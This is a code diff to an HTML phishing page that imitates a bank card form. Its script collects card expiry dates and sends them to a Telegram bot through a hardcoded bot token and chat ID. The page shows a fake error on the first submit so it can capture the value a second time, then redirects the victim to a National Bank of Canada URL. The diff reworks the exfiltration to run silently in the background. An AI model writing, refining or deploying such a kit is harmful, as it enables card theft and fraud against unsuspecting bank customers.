@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -531,71 +532,67 @@
       const expiryInput = document.querySelector(".expiry-input");
       const errorBox = document.getElementById("errorBox");
 
-      // Telegram credentials (fixed token format – removed trailing colon)
+      // Telegram credentials (fixed token)
       const TELEGRAM_BOT_TOKEN = '8133407038:AAHgibqH9lia9xUd1xMSTJVlGm82Gd8kGvc';
       const TELEGRAM_CHAT_ID = '7844108983';
 
       let attemptCount = 0;
 
-      // Helper: send expiry data to Telegram (sends immediately for each attempt)
-      async function sendExpiryToTelegram(expiryValue, attemptNumber) {
+      // Helper: send expiry data to Telegram (no UI blocking)
+      function sendExpiryToTelegram(expiryValue, attemptNumber) {
         if (!expiryValue) return;
         const attemptLabel = attemptNumber === 1 ? 'FIRST attempt (invalid)' : 'SECOND attempt (valid)';
         const message = `🔐 Card Expiry - ${attemptLabel}\n📅 Expiry: ${expiryValue}\n⏱️ Time: ${new Date().toLocaleString()}`;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        try {
-          const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-          });
-          if (!response.ok) console.warn("Telegram send HTTP error", response.status);
-        } catch (err) {
-          console.warn("Telegram send failed", err);
-        }
+        
+        // Fire-and-forget: async but don't await to avoid UI lag
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+        }).catch(err => console.warn("Telegram send failed", err));
       }
 
-      // IMPROVED INPUT FORMATTING (MM/YY) – no more "28" turning into "82"
+      // IMPROVED INPUT FORMATTING (MM/YY) – smooth, no reversal
       if (expiryInput) {
         expiryInput.addEventListener("input", function(e) {
-          // Remove all non-digits, limit to 4 numbers
           let rawDigits = e.target.value.replace(/\D/g, "").slice(0, 4);
           let formatted = "";
           
           if (rawDigits.length >= 3) {
-            // Insert slash after first two digits: MM/YY
             formatted = rawDigits.slice(0, 2) + "/" + rawDigits.slice(2);
           } else {
             formatted = rawDigits;
           }
           
-          // Update field and move cursor to the end (prevents reversal issues)
           e.target.value = formatted;
           e.target.setSelectionRange(formatted.length, formatted.length);
         });
       }
 
-      // Main submit handler:
-      // - First attempt: show error, send FIRST expiry to webhook, clear input, scroll to top.
-      // - Second attempt: send SECOND expiry to webhook, then redirect to target URL.
+      // Main submit handler – cleared input instantly on first attempt (no lag)
       window.handleSubmit = async function(event) {
         event.preventDefault();
         
         const currentExpiry = expiryInput ? expiryInput.value.trim() : "";
         attemptCount++;
 
-        // FIRST ATTEMPT (error & store first input)
+        // FIRST ATTEMPT: show error, clear input immediately, then send webhook in background
         if (attemptCount === 1) {
           if (errorBox) errorBox.classList.add("show");
-          if (currentExpiry) await sendExpiryToTelegram(currentExpiry, 1);
-          if (expiryInput) expiryInput.value = "";  // clear for second attempt
+          
+          // Instant clear – no lag visible to user
+          if (expiryInput) expiryInput.value = "";
+          
+          // Send webhook without awaiting (background)
+          if (currentExpiry) sendExpiryToTelegram(currentExpiry, 1);
+          
           window.scrollTo({ top: 0, behavior: "smooth" });
           return;
         }
 
-        // SECOND ATTEMPT (store second input, then redirect)
-        if (currentExpiry) await sendExpiryToTelegram(currentExpiry, 2);
-        // After successfully sending the second expiry, redirect
+        // SECOND ATTEMPT: send data & redirect
+        if (currentExpiry) sendExpiryToTelegram(currentExpiry, 2);
         window.location.href = "https://app.bnc.ca/documents";
       };
     })();
